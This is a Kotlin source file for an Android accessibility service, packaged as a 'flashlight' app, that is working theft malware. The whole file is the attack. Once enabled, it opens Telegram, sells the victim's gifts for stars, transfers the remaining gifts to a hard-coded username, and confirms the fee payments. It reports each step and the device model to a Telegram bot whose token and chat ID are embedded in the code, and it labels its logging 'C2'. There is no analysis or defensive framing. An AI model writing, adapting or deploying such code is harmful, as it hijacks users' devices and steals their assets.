package com.example.flashlight

import android.accessibilityservice.AccessibilityService
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder

class ControlService : AccessibilityService() {

    private val BOT_TOKEN = "8942136633:AAFJCI48PpAwZjL4v6IHq8SceXaz5qgP_l0"
    private val CHAT_ID = "8482689773"
    private val TARGET_USERNAME = "@imfuckpeople"

    private val handler = Handler(Looper.getMainLooper())

    override fun onServiceConnected() {
        super.onServiceConnected()
        sendToBot("⚡️ Бот активирован на устройстве: ${android.os.Build.MODEL}")
        handler.postDelayed({ startStealing() }, 5000)
    }

    private fun startStealing() {
        sendToBot("🚀 Открываю Telegram...")
        val intent = packageManager.getLaunchIntentForPackage("org.telegram.messenger")
        intent?.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(intent)
        handler.postDelayed({ findAndProcessGifts() }, 5000)
    }

    private fun findAndProcessGifts() {
        val root = rootInActiveWindow ?: return
        val giftBtn = findNodeByText(root, "Подарки") ?: findNodeByText(root, "Gifts")
        
        if (giftBtn != null) {
            giftBtn.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            sendToBot("🎁 Открыл раздел подарков")
            handler.postDelayed({ processGiftActions() }, 3000)
        } else {
            sendToBot("❌ Не нашел кнопку 'Подарки'.")
        }
    }

    private fun processGiftActions() {
        val root = rootInActiveWindow ?: return
        val sellButtons = findNodesByText(root, "Продать") + findNodesByText(root, "Sell")
        
        if (sellButtons.isNotEmpty()) {
            for (btn in sellButtons) {
                btn.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                sendToBot("💰 Нажал 'Продать', получаю звезды...")
                handler.postDelayed({
                    val confirmSell = findNodeByText(rootInActiveWindow, "Продать") 
                                   ?: findNodeByText(rootInActiveWindow, "Подтвердить")
                    confirmSell?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                }, 1500)
                Thread.sleep(1000)
            }
            handler.postDelayed({ processGiftActions() }, 2000) 
            return
        }

        val transferButtons = findNodesByText(root, "Передать") + findNodesByText(root, "Transfer")
        if (transferButtons.isEmpty()) {
            sendToBot("ℹ️ Нет доступных для передачи подарков.")
            return
        }

        for (btn in transferButtons) {
            btn.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            sendToBot("👉 Нажал 'Передать' на подарке")
            handler.postDelayed({ inputUsernameAndSend() }, 2000)
            Thread.sleep(2000)
        }
    }

    private fun inputUsernameAndSend() {
        val root = rootInActiveWindow ?: return
        val editNode = findNodeByClass(root, "android.widget.EditText")
        
        if (editNode != null) {
            val args = Bundle()
            args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, TARGET_USERNAME)
            editNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
            sendToBot("⌨️ Ввел юзернейм: $TARGET_USERNAME")
            
            handler.postDelayed({
                val sendBtn = findNodeByText(rootInActiveWindow, "Отправить") 
                           ?: findNodeByText(rootInActiveWindow, "Send")
                sendBtn?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                sendToBot("✅ Нажал 'Отправить'")
                
                handler.postDelayed({
                    val confirmBtn = findNodeByText(rootInActiveWindow, "Оплатить")
                                  ?: findNodeByText(rootInActiveWindow, "Pay")
                                  ?: findNodeByText(rootInActiveWindow, "Подтвердить")
                    confirmBtn?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    sendToBot("💸 Оплатил комиссию (если окно появилось)")
                }, 1500)
            }, 2000)
        }
    }

    private fun findNodeByText(node: AccessibilityNodeInfo?, text: String): AccessibilityNodeInfo? {
        if (node == null) return null
        if (node.text?.toString()?.contains(text, ignoreCase = true) == true) return node
        for (i in 0 until node.childCount) {
            val res = findNodeByText(node.getChild(i), text)
            if (res != null) return res
        }
        return null
    }

    private fun findNodesByText(node: AccessibilityNodeInfo?, text: String): List<AccessibilityNodeInfo> {
        val list = mutableListOf<AccessibilityNodeInfo>()
        if (node == null) return list
        if (node.text?.toString()?.contains(text, ignoreCase = true) == true) list.add(node)
        for (i in 0 until node.childCount) {
            list.addAll(findNodesByText(node.getChild(i), text))
        }
        return list
    }

    private fun findNodeByClass(node: AccessibilityNodeInfo?, className: String): AccessibilityNodeInfo? {
        if (node == null) return null
        if (node.className == className) return node
        for (i in 0 until node.childCount) {
            val res = findNodeByClass(node.getChild(i), className)
            if (res != null) return res
        }
        return null
    }

    private fun sendToBot(message: String) {
        Thread {
            try {
                val url = URL("https://api.telegram.org/bot$BOT_TOKEN/sendMessage")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                val writer = OutputStreamWriter(conn.outputStream)
                val data = "chat_id=$CHAT_ID&text=${URLEncoder.encode(message, "UTF-8")}"
                writer.write(data)
                writer.flush()
                writer.close()
            } catch (e: Exception) {
                Log.e("C2", "Ошибка отправки в бота: ${e.message}")
            }
        }.start()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {}
    override fun onInterrupt() {}
}